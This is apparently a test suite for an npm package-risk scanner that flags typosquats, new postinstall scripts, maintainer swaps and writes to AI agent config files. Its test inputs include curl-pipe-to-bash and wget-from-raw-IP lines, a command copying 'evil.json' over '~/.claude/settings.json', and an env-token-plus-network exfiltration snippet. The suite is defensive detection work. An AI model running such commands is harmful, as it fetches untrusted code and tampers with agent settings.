import { describe, expect, it } from "bun:test";
import { diffFileSets } from "../src/diff.js";
import { analyze, runHeuristics, score } from "../src/heuristics/index.js";
import { editDistance, findTyposquat } from "../src/heuristics/nameDistance.js";
import { scanJsSource, scanShellScript } from "../src/heuristics/scriptScan.js";
import {
  agentConfigWriter,
  cleanEstablishedPackage,
  cleanNewPackage,
  curlPipePayload,
  type Fixture,
  hijackedPackage,
  typosquatWithPayload,
} from "./fixtures.js";

function evaluate(fx: Fixture) {
  const diff = diffFileSets(fx.current, fx.previous, {
    metaScripts: fx.meta.scripts,
    prevMetaScripts: fx.meta.previousScripts,
  });
  return runHeuristics(fx.meta, diff);
}

describe("editDistance", () => {
  it("computes basic edits", () => {
    expect(editDistance("is-odd", "is0dd")).toBeLessThanOrEqual(2);
    expect(editDistance("react", "react")).toBe(0);
    expect(editDistance("chalk", "chlak")).toBe(1);
  });
});

describe("findTyposquat", () => {
  it("flags near-misses of popular packages", () => {
    const m = findTyposquat("is0dd");
    expect(m?.target).toBe("is-odd");
  });
  it("does not flag the real package", () => {
    expect(findTyposquat("react")).toBeNull();
    expect(findTyposquat("lodash")).toBeNull();
  });
  it("ignores very short names", () => {
    expect(findTyposquat("ab")).toBeNull();
  });
});

describe("scanShellScript", () => {
  it("detects curl-pipe-to-shell", () => {
    const f = scanShellScript("curl -s http://x/i.sh | bash");
    expect(f.some((x) => x.kind === "network")).toBe(true);
    expect(f.some((x) => x.kind === "shell_exec")).toBe(true);
  });
  it("detects raw IPs", () => {
    expect(scanShellScript("wget http://185.234.72.19/x").some((x) => x.kind === "raw_ip")).toBe(
      true,
    );
  });
  it("is quiet on a normal build script", () => {
    expect(scanShellScript("tsc && vitest run")).toHaveLength(0);
  });
});

describe("scanJsSource", () => {
  it("detects child_process, network, base64, env", () => {
    const kinds = scanJsSource(
      "const cp=require('child_process');const h=require('https');Buffer.from(x,'base64');process.env.TOKEN;",
    ).map((f) => f.kind);
    expect(kinds).toContain("child_process");
    expect(kinds).toContain("network");
    expect(kinds).toContain("base64");
    expect(kinds).toContain("env_exfil");
  });
  it("is quiet on plain library code", () => {
    expect(scanJsSource("export const add = (a,b) => a + b;")).toHaveLength(0);
  });
});

describe("verdict scoring", () => {
  it("flags a typosquat with an exfiltrating postinstall as HIGH", () => {
    const r = evaluate(typosquatWithPayload);
    expect(r.level).toBe("HIGH");
    expect(r.flags).toContain("typosquat");
    expect(r.flags).toContain("new_postinstall");
    expect(r.flags).toContain("network_in_script");
    expect(r.score).toBeGreaterThanOrEqual(6.5);
  });

  it("flags a curl-pipe-to-shell postinstall as HIGH", () => {
    const r = evaluate(curlPipePayload);
    expect(r.level).toBe("HIGH");
    expect(r.flags).toContain("new_postinstall");
    expect(r.flags).toContain("network_in_script");
  });

  it("flags a hijacked package (maintainer swap + new obfuscated postinstall) as HIGH", () => {
    const r = evaluate(hijackedPackage);
    expect(r.level).toBe("HIGH");
    expect(r.flags).toContain("maintainer_changed");
    expect(r.flags).toContain("new_postinstall");
  });

  it("flags a package that writes to agent config paths", () => {
    const r = evaluate(agentConfigWriter);
    expect(r.flags).toContain("writes_agent_config");
    expect(r.level).toBe("HIGH");
  });

  it("does NOT flag a clean brand-new package (newness alone is not risk)", () => {
    const r = evaluate(cleanNewPackage);
    expect(r.level).toBe("LOW");
    expect(r.flags).not.toContain("recent_publish");
    expect(r.flags).not.toContain("low_install_history");
  });

  it("does NOT flag a clean established package with a legit build script", () => {
    const r = evaluate(cleanEstablishedPackage);
    expect(r.level).toBe("LOW");
  });
});

describe("analyze — signal coverage", () => {
  const emptyDiff = () => diffFileSets([], undefined, {});

  it("flags a changed lifecycle script on an existing package", () => {
    const diff = diffFileSets([], [], {
      metaScripts: { preinstall: "node collect.js" },
      prevMetaScripts: { preinstall: "node ok.js" },
      isNewPackage: false,
    });
    const signals = analyze(cleanEstablishedPackage.meta, diff);
    expect(
      signals.some((s) => s.flag === "new_install_script" && s.evidence.includes("changed")),
    ).toBe(true);
  });

  it("scans non-lifecycle script bodies too", () => {
    const diff = diffFileSets([], [], {
      metaScripts: { build: "curl http://e/i.sh | bash" },
      isNewPackage: false,
    });
    const signals = analyze(cleanEstablishedPackage.meta, diff);
    expect(signals.some((s) => s.flag === "network_in_script")).toBe(true);
  });

  it("suppresses an env read without any network capability", () => {
    const files = [{ path: "a.js", size: 10, content: "const t = process.env.T;", binary: false }];
    const diff = diffFileSets(files, undefined, {});
    const signals = analyze(cleanNewPackage.meta, diff);
    expect(signals.some((s) => s.evidence.includes("process.env"))).toBe(false);
  });

  it("boosts env read + network into an exfiltration-shape signal", () => {
    const files = [
      { path: "a.js", size: 40, content: "fetch('https://e'); process.env.TOKEN;", binary: false },
    ];
    const diff = diffFileSets(files, undefined, {});
    const signals = analyze(cleanNewPackage.meta, diff);
    expect(signals.some((s) => s.evidence.includes("exfiltration shape"))).toBe(true);
  });

  it("flags agent-config paths referenced from script bodies", () => {
    const diff = diffFileSets([], undefined, {
      metaScripts: { postinstall: "cp evil.json ~/.claude/settings.json" },
    });
    const signals = analyze(cleanNewPackage.meta, diff);
    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(true);
  });

  it("flags a deprecated package", () => {
    const meta = { ...cleanEstablishedPackage.meta, deprecated: "no longer maintained" };
    const signals = analyze(meta, emptyDiff());
    expect(signals.some((s) => s.flag === "deprecated")).toBe(true);
  });

  it("weights typosquats of mid-popularity packages lower", () => {
    const meta = { ...cleanNewPackage.meta, name: "is0dd" };
    const signals = analyze(meta, emptyDiff());
    const squat = signals.find((s) => s.flag === "typosquat");
    expect(squat?.weight).toBe(4);
  });
});

describe("score — gating and damping", () => {
  it("drops newness signals without an action signal", () => {
    const r = score(cleanNewPackage.meta, [
      { flag: "recent_publish", evidence: "new", weight: 1.5, requiresActionSignal: true },
      { flag: "deprecated", evidence: "old", weight: 1 },
    ]);
    expect(r.flags).toEqual(["deprecated"]);
    expect(r.score).toBe(1);
  });

  it("keeps newness signals when an action signal exists", () => {
    const r = score(cleanNewPackage.meta, [
      { flag: "recent_publish", evidence: "new", weight: 1.5, requiresActionSignal: true },
      { flag: "new_postinstall", evidence: "postinstall", weight: 2.5, isActionSignal: true },
    ]);
    expect(r.flags).toContain("recent_publish");
    expect(r.level).toBe("MEDIUM");
  });

  it("damps residual noise for trusted maintainers without action signals", () => {
    const r = score(cleanEstablishedPackage.meta, [
      { flag: "deprecated", evidence: "old", weight: 2 },
    ]);
    expect(r.score).toBeLessThan(1);
    expect(r.level).toBe("LOW");
  });

  it("does not damp action signals for trusted maintainers", () => {
    const r = score(cleanEstablishedPackage.meta, [
      { flag: "new_postinstall", evidence: "postinstall", weight: 7, isActionSignal: true },
    ]);
    expect(r.score).toBe(7);
    expect(r.level).toBe("HIGH");
  });

  it("clamps the score to 10", () => {
    const r = score(cleanNewPackage.meta, [
      { flag: "typosquat", evidence: "squat", weight: 9, isActionSignal: true },
      { flag: "new_postinstall", evidence: "postinstall", weight: 9, isActionSignal: true },
    ]);
    expect(r.score).toBe(10);
    expect(r.level).toBe("HIGH");
  });
});

describe("analyze — agent-config and typosquat edges", () => {
  it("flags AGENTS.md shipped in the tarball", () => {
    const files = [{ path: "AGENTS.md", size: 5, content: "hi", binary: false }];
    const diff = diffFileSets(files, undefined, {});
    const signals = analyze(cleanNewPackage.meta, diff);
    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(true);
  });

  it("does not flag agent-config paths on established diffs without changes", () => {
    const diff = diffFileSets([], [], {});
    const signals = analyze(cleanEstablishedPackage.meta, diff);
    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(false);
  });

  it("ignores the scope when checking typosquats", () => {
    const meta = { ...cleanNewPackage.meta, name: "@acme/lodahs" };
    const signals = analyze(meta, diffFileSets([], undefined, {}));
    expect(signals.some((s) => s.flag === "typosquat")).toBe(true);
  });
});
